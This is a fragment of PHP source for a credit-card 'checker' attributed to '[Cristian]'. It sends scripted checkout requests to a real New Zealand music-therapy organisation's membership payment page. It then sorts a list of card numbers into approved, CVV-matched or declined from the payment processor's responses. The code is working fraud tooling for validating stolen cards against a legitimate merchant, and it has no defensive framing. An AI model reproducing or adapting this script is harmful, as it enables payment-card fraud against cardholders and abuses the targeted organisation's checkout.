...
'content-type: multipart/form-data; boundary=----WebKitFormBoundaryIaogn7KaxUuzBGRv',
'referer: https://www.musictherapy.org.nz/register/registered-music-therapists/?action=checkout&txn=81'
));

curl_setopt($ch, CURLOPT_POSTFIELDS, '------WebKitFormBoundaryIaogn7KaxUuzBGRv
Content-Disposition: form-data; name="mepr_transaction_id"

289
------WebKitFormBoundaryIaogn7KaxUuzBGRv
...
https://www.musictherapy.org.nz/register/registered-music-therapists/?action=checkout&txn=81#mepr_jump
------WebKitFormBoundaryIaogn7KaxUuzBGRv--
');
...
if (strpos($result, '"cvc_check": "pass"')) {
  echo '<span class="badge badge-success">#Approved_CVV</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-success">✓</span> <span class="badge badge-success"> ★ CVV MATCHED [Cristian] </span> </span> <span class="badge badge-info"> '.$bank.'  ('.$country.') </span> </br>';
}
...
$debitouu = $valores[mt_rand(0,9)];
  /*echo '<span class="badge badge-success">#Aprovada ? '.$lista.' | Informaci�n | BIN: '.$binn.' | PAIS: '.$pais.' | BANCO: '.$banco.' | BANDEIRA: '.$brand.' | NIVEL: '.$level.' | PR�-PAGO : '.$prepago.' | <br>PHONE : '.$fone.' | TIPO : '.$tipo.' | LATITUDE : '.$latitude.' | LONGITUDE : '.$logitude.' | DATA: '.$data.' | GATE [Cristian] | DEBITOU: '.$debitouu.' cc checker By [Cristian] </span>  </br>';*/
  echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">✕</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-success">✕</span> <span class="badge badge-success"> DEBITO: '.$debitouu.' | CC Checker By [Cristian] </span> </br>';
}


elseif(strpos($result, 'Your card was declined.')) {
  echo '<span class="new badge-info">#Reprovada</span> <span class="new badge-info">✕</span> <span class="new badge-info">' . $lista . '</span> <span class="new badge-info">✕</span> <span class="badge badge-info"> ★ Card Declined [Cristian] </span></br>';
}

 else {
  echo '<span class="new badge-info">#Reprovada</span> <span class="new badge-info">✕</span> <span class="new badge-info">' . $lista . '</span> <span class="new badge-info">✕</span> <span class="badge badge-info"> ★ Error Not Listed [Cristian] </span> </br>';
}
